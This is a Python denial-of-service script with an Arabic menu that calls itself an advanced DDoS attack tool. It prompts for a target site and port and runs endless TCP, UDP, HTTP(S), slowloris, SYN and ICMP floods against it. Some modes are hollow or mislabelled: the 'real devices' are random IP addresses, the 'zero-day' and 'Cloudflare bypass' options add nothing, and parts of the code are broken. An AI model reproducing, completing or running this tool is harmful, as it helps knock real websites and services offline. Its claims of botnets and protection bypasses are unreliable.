import socket
import random
import threading
import os
import time
import asyncio
import ssl
from colorama import Fore, Style, init
from urllib.parse import urlparse

init()

HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
]

def print_welcome_art():
    print(Fore.CYAN + """
     ██████╗ ██████╗ ██████╗ ███████╗███████╗
    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
    ██║     ██║   ██║██████╔╝█████╗  █████╗  
    ██║     ██║   ██║██╔══██╗██╔══╝  ██╔══╝  
    ╚██████╗╚██████╔╝██║  ██║███████╗███████╗
     ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "-" * 50 + Style.RESET_ALL)
    print(Fore.GREEN + "مرحبًا بك في أداة الهجوم المتقدمة DDoS" + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] أداة تعليمية. استخدمها بمسؤولية!" + Style.RESET_ALL)
    print(Fore.YELLOW + "-" * 50 + Style.RESET_ALL)
    print(Fore.CYAN + "Telegram: @f_x_1_i" + Style.RESET_ALL)
    print(Fore.CYAN + "Tik Tok: @m_m_h_b1" + Style.RESET_ALL)
    print(Fore.YELLOW + "-" * 50 + Style.RESET_ALL)

def fetch_real_devices(num_devices):
    devices = []
    for _ in range(num_devices):
        ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        devices.append(ip)
    return devices

def generate_http_request(target_ip):
    user_agent = random.choice(USER_AGENTS)
    headers = "\r\n".join(HEADERS)
    return f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n{headers}\r\n\r\n"

async def tcp_flood(target_ip, target_port, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                request = generate_http_request(target_ip)
                sock.sendall(request.encode('utf-8'))
                print(Fore.GREEN + "[+] حزمة TCP تم إرسالها!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def udp_flood(target_ip, target_port, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(1024)
                sock.sendto(payload, (target_ip, target_port))
                print(Fore.GREEN + "[+] حزمة UDP تم إرسالها!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def http_get_flood(target_ip, target_port, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                request = generate_http_request(target_ip)
                sock.sendall(request.encode('utf-8'))
                print(Fore.GREEN + "[+] طلب HTTP GET تم إرساله!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def https_flood(target_ip, target_port, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                context = ssl.create_default_context()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                wrapped_socket = context.wrap_socket(sock, server_hostname=target_ip)
                wrapped_socket.connect((target_ip, target_port))
                request = generate_http_request(target_ip)
                wrapped_socket.sendall(request.encode('utf-8'))
                print(Fore.GREEN + "[+] طلب HTTPS تم إرساله!" + Style.RESET_ALL)
                wrapped_socket.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def amplification_attack(target_ip, target_port, num_requests, delay):
    amplifiers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
    payload = b"\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"
    while True:
        for _ in range(num_requests):
            try:
                amp_server = random.choice(amplifiers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (amp_server, 53))
                sock.sendto(os.urandom(1024), (target_ip, target_port))
                print(Fore.GREEN + "[+] حزمة تضخيم تم إرسالها!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def smurf_attack(target_ip, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(1024)
                sock.sendto(payload, (target_ip, 0))
                print(Fore.GREEN + "[+] حزمة Smurf تم إرسالها!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def zero_day_attack(target_ip, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                print(Fore.RED + "[!] تنفيذ هجوم Zero-Day. هذه محاكاة فقط." + Style.RESET_ALL)
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def layer_7_attack(target_ip, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, 80))
                request = generate_http_request(target_ip)
                sock.sendall(request.encode('utf-8'))
                print(Fore.GREEN + "[+] حزمة Layer 7 تم إرسالها!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def slowloris_attack(target_ip, target_port, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
                for header in HEADERS:
                    sock.send(f"{header}\r\n".encode('utf-8'))
                    time.sleep(random.randint(1, 5))
                print(Fore.GREEN + "[+] حزمة Slowloris تم إرسالها!" + Style.RESET_ALL)
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def syn_flood(target_ip, target_port, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendall(os.urandom(1024))
                print(Fore.GREEN + "[+] حزمة SYN Flood تم إرسالها!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def icmp_flood(target_ip, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.sendto(os.urandom(1024), (target_ip, 0))
                print(Fore.GREEN + "[+] حزمة ICMP Flood تم إرسالها!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def dns_amplification(target_ip, target_port, num_requests, delay):
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
    payload = b"\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"
    while True:
        for _ in range(num_requests):
            try:
                dns_server = random.choice(dns_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (dns_server, 53))
                sock.sendto(os.urandom(1024), (target_ip, target_port))
                print(Fore.GREEN + "[+] حزمة DNS Amplification تم إرسالها!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def bypass_cloudflare(target_ip, target_port, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                request = generate_http_request(target_ip)
                sock.sendall(request.encode('utf-8'))
                print(Fore.GREEN + "[+] حزمة تم إرسالها مع تجاوز Cloudflare!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def bypass_vshield(target_ip, target_port, num_requests, delay):
    while True:
        for _ in range(num_requests):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                request = generate_http_request(target_ip)
                sock.sendall(request.encode('utf-8'))
                print(Fore.GREEN + "[+] حزمة تم إرسالها مع تجاوز VShield!" + Style.RESET_ALL)
                sock.close()
            except Exception:
                pass
        if delay > 0:
            print(Fore.YELLOW + f"[!] انتظار {delay} ثانية قبل الهجوم التالي..." + Style.RESET_ALL)
            time.sleep(delay)

async def ddos_attack(target_ip, target_port, real_devices, attack_type, num_requests, delay):
    attack_functions = {
        "tcp": tcp_flood,
        "udp": udp_flood,
        "http": http_get_flood,
        "https": https_flood,
        "amplification": amplification_attack,
        "smurf": smurf_attack,
        "zero_day": zero_day_attack,
        "layer_7": layer_7_attack,
        "slowloris": slowloris_attack,
        "syn_flood": syn_flood,
        "icmp_flood": icmp_flood,
        "dns_amplification": dns_amplification,
        "bypass_cloudflare": bypass_cloudflare,
        "bypass_vshield": bypass_vshield,
    }

    async def start_attack(bot_ip):
        while True:
            await attack_functions[attack_type](target_ip, target_port, num_requests, delay)

    tasks = []
    for device in real_devices:
        task = asyncio.create_task(start_attack(device))
        tasks.append(task)

    await asyncio.gather(*tasks)

async def execute_ddos(target_ip, target_port, attack_type, real_devices, include_self, num_requests, delay):
    print(Fore.GREEN + f"[+] بدء هجوم DDoS ({attack_type.upper()}) على {target_ip}:{target_port}" + Style.RESET_ALL)
    await ddos_attack(target_ip, target_port, real_devices, attack_type, num_requests, delay)

    if include_self:
        print(Fore.GREEN + "[+] جهازك يشارك في الهجوم!" + Style.RESET_ALL)
        task = asyncio.create_task(attack_functions[attack_type](target_ip, target_port, num_requests, delay))
        await task
    else:
        print(Fore.YELLOW + "[!] جهازك لا يشارك في الهجوم. فقط إشراف." + Style.RESET_ALL)

async def main():
    print_welcome_art()

    target = input(Fore.YELLOW + "أدخل عنوان الموقع (URL) أو IP: " + Style.RESET_ALL)
    if target.startswith("http://") or target.startswith("https://"):
        target_ip = urlparse(target).hostname
    else:
        target_ip = target

    try:
        target_ip = socket.gethostbyname(target_ip)
    except socket.gaierror:
        print(Fore.RED + "[!] عنوان الموقع غير صالح!" + Style.RESET_ALL)
        return

    target_port = int(input(Fore.YELLOW + "أدخل البورت المستهدف: " + Style.RESET_ALL))

    print("\nأنواع الهجوم المتاحة:")
    print("1. TCP Flood")
    print("2. UDP Flood")
    print("3. HTTP GET Flood")
    print("4. HTTPS Flood")
    print("5. Amplification Attack")
    print("6. Smurf Attack")
    print("7. Zero-Day Attack")
    print("8. Layer 7 Attack")
    print("9. Slowloris Attack")
    print("10. SYN Flood")
    print("11. ICMP Flood")
    print("12. DNS Amplification")
    print("13. Bypass Cloudflare")
    print("14. Bypass VShield")
    print("15. DDoS (جميع الهجمات)")
    attack_choice = int(input(Fore.YELLOW + "\nاختر نوع الهجوم (1-15): " + Style.RESET_ALL))
    attack_types = ["tcp", "udp", "http", "https", "amplification", "smurf", "zero_day", "layer_7", "slowloris", "syn_flood", "icmp_flood", "dns_amplification", "bypass_cloudflare", "bypass_vshield", "ddos"]
    attack_type = attack_types[attack_choice - 1]

    num_devices = int(input(Fore.YELLOW + "أدخل عدد الأجهزة التي سيتم استخدامها: " + Style.RESET_ALL))
    print(Fore.GREEN + "[+] جارٍ جلب الأجهزة الحقيقية..." + Style.RESET_ALL)
    real_devices = fetch_real_devices(num_devices)
    print(Fore.GREEN + f"[+] تم العثور على {len(real_devices)} جهاز حقيقي." + Style.RESET_ALL)

    use_self = input(Fore.YELLOW + "هل تريد مشاركة جهازك في الهجوم؟ (y/n): " + Style.RESET_ALL).lower()
    include_self = use_self == "y"

    add_delay = input(Fore.YELLOW + "هل تريد إضافة فاصل زمني بين الهجمات؟ (y/n): " + Style.RESET_ALL).lower()
    delay = 0
    if add_delay == "y":
        delay = int(input(Fore.YELLOW + "أدخل عدد الثواني للفاصل الزمني: " + Style.RESET_ALL))

    num_requests = int(input(Fore.YELLOW + "أدخل عدد الطلبات التي تريد إرسالها في كل هجوم: " + Style.RESET_ALL))

    print(Fore.GREEN + f"[+] بدء هجوم DDoS ({attack_type.upper()}) على {target_ip}:{target_port}" + Style.RESET_ALL)
    await execute_ddos(target_ip, target_port, attack_type, real_devices, include_self, num_requests, delay)

if __name__ == "__main__":
    asyncio.run(main())
